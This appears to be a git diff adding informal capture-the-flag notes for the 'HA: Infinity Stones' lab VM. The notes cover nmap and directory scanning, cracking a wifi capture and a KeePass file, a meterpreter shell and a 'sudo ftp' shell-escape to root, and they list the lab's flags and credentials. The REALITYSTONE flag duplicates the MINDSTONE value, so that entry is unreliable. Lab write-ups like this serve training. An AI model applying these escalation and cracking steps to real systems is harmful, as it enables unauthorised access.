@@ -1,0 +1,168 @@
+We got the VM 
+Gotta find the inifinity stones to help THANOS 
+
+LETS GO 
+
+Discovered the IP 
+
+and did an nmap -A -p- 
+
+
+And got 
+
+Nmap scan report for 192.168.57.213
+Host is up (0.00093s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 84:d2:2e:c4:f7:21:12:54:05:ac:82:c4:05:f2:32:29 (RSA)
+|   256 f7:9d:0f:23:ec:d6:de:ed:2b:b2:11:bf:ea:68:3d:b9 (ECDSA)
+|_  256 78:ef:fc:36:47:e6:f3:8d:03:3a:39:69:60:4f:2a:71 (ED25519)
+80/tcp   open  http     Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA:Infinity Stones
+443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA:Infinity Stones
+| ssl-cert: Subject: commonName=ignite/organizationName=MINDSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}/stateOrProvinceName=UP/countryName=IN
+| Issuer: commonName=ignite/organizationName=MINDSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}/stateOrProvinceName=UP/countryName=IN
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2019-09-15T17:18:57
+| Not valid after:  2020-09-14T17:18:57
+| MD5:   f5f5 8485 5fe6 08ea f9b9 9d51 313a c44f
+|_SHA-1: 567f b705 07e9 9ea0 c010 ab64 63de 0afc 3487 9a69
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   http/1.1
+|   http/1.1
+|   http/1.1
+|   http/1.1
+|   http/1.1
+|   http/1.1
+|   http/1.1
+|   http/1.1
+
+8080/tcp open  http     Jetty 9.4.z-SNAPSHOT
+|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+MAC Address: 00:0C:29:0D:35:B5 (VMware)
+
+Using 80 , we ran nikto and got /img folder 
+
+Inside we found the tesseract image
+
+Downloaded the image and used strings 
+
+we got SPACESTONE:{74E57403424607145B9B77809DEB49D0}
+
+Our first stone
+
+Lets keep digging 
+IN the nmap, we get the mind gem 
+
+MINDSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}
+
+On using dirb, we got a pwd txt and a .cap file having wifi packets captured 
+
+The pwd file gave hints to password, for we used mp64 
+
+and used aircrack-ng to break the file and get the key 
+
+We found 
+gamA00fe2012
+
+to be the key
+
+
+Using the http://192.168.57.213/gamA00fe2012
+
+we get the 3rd stone
+REALITYSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}
+
+
+Hint from walkthrough, we need to solve the quiz 
+
+The answers are 
+0
+1
+1
+0
+1
+0
+0
+1
+
+01101001
+
+
+On going to http://192.168.57.213/01101001, we get a hint.txt which has brainfuck language
+Decoding it, we get admin:avengers
+
+
+We expoit the system using the meterpreter shell and we find the TIME STone 
+TIMESTONE:{141BC86DFD5C40E3CC37219C18D471CA}
+
+We searched in the /opt and found a password database name morag.kdbx 
+
+We searched for script to convert the password database to hash and we gave
+it to john to give us the password 
+
+princesa
+
+We opened the database and entered the password and got some credentials 
+Within it we also got a flag , 
+
+The POWERSTONE{EDDF140F156862C9B494C0B767DCD412}
+
+
+The first format was base64 and we did a echo $string | base64 -d 
+
+and got morag:yondu 
+
+We see morag to a user, so we logged onto it by ssh 
+
+we ran sudo -l 
+
+and found /usr/bin/ftp to sudo enabled 
+
+Searching the net, the exploit was found to be in hackingarticles ,
+we had to do 
+
+sudo ftp
+! /bin/bash 
+
+and we get root 
+
+Going into the root folder we unravel the last 
+gem 
+
+SOULSTONE:{56F06B4DAC14CE346998483989ABFF16}
+
+
+Six stones. 
+SPACESTONE:{74E57403424607145B9B77809DEB49D0}
+MINDSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}
+REALITYSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}
+TIMESTONE:{141BC86DFD5C40E3CC37219C18D471CA}
+POWERSTONE{EDDF140F156862C9B494C0B767DCD412}
+SOULSTONE:{56F06B4DAC14CE346998483989ABFF16}
+
+
+The Infinity Gauntlet and To Thanos .
+
+And we make the universe
+
+Perfectly balanced . As all things should be. 
+
+The hardest VMs require the strongest of skills
+
